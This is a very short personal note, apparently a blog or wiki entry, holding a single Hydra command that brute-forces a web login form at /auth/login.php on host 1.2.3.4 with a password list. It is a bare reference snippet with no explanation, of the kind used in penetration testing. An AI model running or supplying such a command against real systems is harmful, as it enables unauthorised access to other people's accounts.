---
title: hydra
date: 2012-01-17T13:53:53
tags: 
- Software
- Hydra
---

    hydra -l user -P testy 1.2.3.4 http-post-form "/auth/login.php:username=^USER^&password=^PASS^&submit=Login:gpp"
